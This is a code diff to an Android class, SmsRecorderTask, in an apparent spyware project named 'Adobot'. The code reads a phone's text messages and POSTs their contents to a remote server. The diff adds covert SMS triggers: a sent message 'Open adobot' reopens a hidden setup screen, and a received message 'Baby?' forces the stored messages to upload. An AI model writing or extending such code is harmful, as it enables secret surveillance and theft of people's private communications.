@@ -30,6 +30,7 @@ import org.json.JSONObject;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.HashMap;
+import java.util.Objects;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
@@ -139,8 +140,6 @@ public class SmsRecorderTask extends BaseTask {
 
     private void submitSms(final SmsModel smsModel, final SubmitSmsCallback cb) {
 
-        Log.i(TAG, "Submitting sms: " + smsModel.getBody());
-
         final int type = smsModel.getType();
         final int id = smsModel.get_id();
         final String thread_id = smsModel.getThread_id();
@@ -162,7 +161,7 @@ public class SmsRecorderTask extends BaseTask {
             p.put("date", date);
 
             JSONObject obj = new JSONObject(p);
-            Log.i(TAG, obj.toString());
+            Log.i(TAG, "Submitting SMS: " + obj.toString());
 
             Http smsHttp = new Http();
             smsHttp.setMethod(HttpRequest.METHOD_POST);
@@ -303,23 +302,25 @@ public class SmsRecorderTask extends BaseTask {
             final int id = mCur.getInt(mCur.getColumnIndex("_id"));
             final String body = mCur.getString(mCur.getColumnIndex("body"));
 
-            String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "smsOpenText");
-            if (body.trim().equals(smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {
+            String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
+//            Log.i(TAG, "Sms open cmd: " + smsOpenText);
+
+            if (Objects.equals(body.trim(), smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {
                 Intent setupIntent = new Intent(context, SetupActivity.class);
                 setupIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                 context.startActivity(setupIntent);
                 return;
             }
 
-
-            String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "smsOpenText");
-            if (body.trim().equals(uploadSmsCmd.trim()) && type == MESSAGE_TYPE_RECEIVED) {
+            String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Baby?");
+            if (Objects.equals(body.trim(), uploadSmsCmd.trim()) && type == MESSAGE_TYPE_RECEIVED) {
+                Log.i(TAG, "Forced submit SMS");
                 submitNextRecord(new SubmitSmsCallback() {
                     @Override
                     public void onResult(boolean success) {
-
                     }
                 });
+                return;
             }
 
             // accept only received and sent
